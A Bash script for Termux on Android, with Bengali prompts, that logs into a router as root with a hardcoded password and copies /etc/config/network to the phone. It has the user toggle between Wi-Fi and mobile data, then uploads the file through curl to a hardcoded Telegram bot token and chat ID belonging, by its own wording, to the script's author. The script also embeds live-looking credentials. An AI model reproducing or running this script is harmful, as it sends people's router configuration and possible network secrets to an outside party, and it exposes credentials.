#!/usr/bin/env bash
# Filename: ssh_fetch.sh
# Termux script — বাংলা UI
# বলুন যদি আপনি পরিবর্তন চান: host, user, password ইত্যাদি

set -euo pipefail
IFS=$'\n\t'

# === কনফিগারেশন (প্রয়োজনে বদলান) ===
SSH_USER="root"
SSH_HOST="192.168.1.1"
REMOTE_PATH="/etc/config/network"
LOCAL_FILE="${HOME}/network.conf"
# (আপনি আগে থেকেই দিয়েছেন) পাসওয়ার্ড এখানে সেট করা হলো:
SSH_PASS="zihad0172766"

# Telegram bot
TG_BOT_TOKEN="8183938422:AAGi5MFKU-ral8C-uX4uvSswpuOsf8od8eQ"
TG_CHAT_ID="6252809542"

# === সহায়ক ফাংশন ===
print_bangla() {
  # UTF-8 output in termux
  echo -e "$1"
}

# 1) আপডেট ও প্যাকেজ ইনস্টল
print_bangla "প্রথমে প্রয়োজনীয় প্যাকেজ ইনস্টল করা হচ্ছে...\n(প্রয়োজন হলে প্রথমবার 'pkg' অনুমতি চাইবে)।"
pkg update -y >/dev/null 2>&1 || true
pkg install -y openssh expect curl >/dev/null 2>&1

print_bangla "\nপ্যাকেজ ইনস্টল সম্পন্ন।"

# 2) ইউজারকে বলুন মোবাইল ডাটা বন্ধ করে Wi-Fi কানেক্ট করতে
print_bangla "\nঅনুগ্রহ করে আপনার মোবাইল ডাটা বন্ধ করুন এবং আপনার ফোন Wi-Fi দিয়ে রাউটার (একই নেটওয়ার্ক)-এ কানেক্ট করুন।"
read -r -p $'\nএখানে Y দিলে চালিয়ে যাবে (y/Y): ' CONF1
if [[ ! "$CONF1" =~ ^[Yy]$ ]]; then
  print_bangla "আপনি Y দেননি — স্ক্রিপ্ট বন্ধ করা হলো।"
  exit 1
fi

# 3) SCP করার জন্য temporary expect script তৈরি করা
EXPECT_SCRIPT="$(mktemp)"
cat > "${EXPECT_SCRIPT}" <<EOF
#!/usr/bin/expect -f
set timeout 30

# পরিবর্তন করতে চাইলে নিচের ভ্যারিয়েবলগুলো পরিবর্তন করুন
set user "${SSH_USER}"
set host "${SSH_HOST}"
set remote "${REMOTE_PATH}"
set local "${LOCAL_FILE}"
set pass "${SSH_PASS}"

# spawn scp
spawn scp \$user@\${host}:\${remote} \$local

# handle host key confirmation and password prompt
expect {
  -re {Are you sure you want to continue connecting.*} {
    send "yes\r"
    exp_continue
  }
  -re {assword:} {
    send "\$pass\r"
  }
  timeout {
    puts "ERROR: SCP timed out."
    exit 2
  }
}
expect eof
EOF
chmod +x "${EXPECT_SCRIPT}"

print_bangla "\nরাউটার থেকে কনফিগ ফাইল ডাউনলোড করা হবে — অনুগ্রহ করে অপেক্ষা করুন..."
# 4) রান করানো
if "${EXPECT_SCRIPT}"; then
  print_bangla "\nডাউনলোড সফল: ${LOCAL_FILE}"
else
  print_bangla "\nডাউনলোড ব্যর্থ হয়েছে। দয়া করে নেটওয়ার্ক সংযোগ ও পাসওয়ার্ড চেক করুন।"
  rm -f "${EXPECT_SCRIPT}"
  exit 2
fi

# পরিষ্কার (expect script মুছে দেয়া)
rm -f "${EXPECT_SCRIPT}"

# 5) মোবাইল ডাটা চালু করতে বলুন
print_bangla "\nএখন অনুগ্রহ করে মোবাইল ডাটা (Mobile Data) চালু করুন যাতে ইন্টারনেট পাওয়া যায় এবং কনফিগ ফাইলটি আমার টেলিগ্রামে পাঠানো যাবে।"
read -r -p $'\nমোবাইল ডাটা চালু করে Y দিন: ' CONF2
if [[ ! "$CONF2" =~ ^[Yy]$ ]]; then
  print_bangla "আপনি Y দেননি — ফাইল পাঠানো বাতিল করা হলো। (ফাইল লোকালপথে রাখা আছে: ${LOCAL_FILE})"
  exit 0
fi

# 6) টেলিগ্রামে ফাইল পাঠানো
print_bangla "\nকনফিগ ফাইল টেলিগ্রামে পাঠানো হচ্ছে..."
TG_API="https://api.telegram.org/bot${TG_BOT_TOKEN}/sendDocument"

HTTP_RESPONSE=$(curl -s -w "%{http_code}" -o /tmp/tg_result.txt -F document=@"${LOCAL_FILE}" "${TG_API}?chat_id=${TG_CHAT_ID}") || true
HTTP_CODE="${HTTP_RESPONSE:(-3)}"  # last three chars are status code

if [[ "${HTTP_CODE}" == "200" ]]; then
  print_bangla "\nফাইল সফলভাবে টেলিগ্রামে পাঠানো হয়েছে।"
  # ঐচ্ছিক: লোকাল ফাইল মুছতে চাইলে আনকমেন্ট করুন
  # rm -f "${LOCAL_FILE}"
else
  print_bangla "\nটেলিগ্রামে পাঠাতে ব্যর্থ হয়েছে (HTTP status: ${HTTP_CODE})। কিছুকাল অপেক্ষা করে পুনরায় চেষ্টা করুন।"
  print_bangla "কোমেন্টস/রেসপন্স:"
  sed -n '1,200p' /tmp/tg_result.txt || true
fi

# শেষ
print_bangla "\nসম্পন্ন। লোকাল ফাইল: ${LOCAL_FILE}"
